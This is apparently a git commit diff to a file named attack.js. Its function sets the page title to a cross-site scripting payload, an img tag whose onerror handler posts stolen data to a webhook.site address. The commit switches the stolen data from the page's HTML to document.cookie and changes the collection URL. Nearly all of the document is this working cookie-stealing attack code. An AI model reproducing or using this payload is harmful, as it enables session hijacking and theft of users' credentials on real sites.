f469cfa3d14d9103de2a8f9d9741830f2b26d5cf
JBA192 <62188601+JBA192@users.noreply.github.com>
2023-09-22 13:56:14 -0400

    Update attack.js

--- attack.js
+++ attack.js
@@ -1,6 +1,6 @@
 function changeTitle() {
-    var attackScript = "<img src='x' onerror='var html = document.documentElement.outerHTML;var server" + 
-    " = new XMLHttpRequest;server.open(\"POST\", \"https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c\"," + 
+    var attackScript = "<img src='x' onerror='var html = document.cookie;var server" + 
+    " = new XMLHttpRequest;server.open(\"POST\", \"https://webhook.site/38ba9692-250b-438c-8533-896161eb3628\"," + 
     "true);server.setRequestHeader(\"Content-Type\", \"text/plain\");server.send(html);'>";
     if (document.title != attackScript) {
         document.title = attackScript;
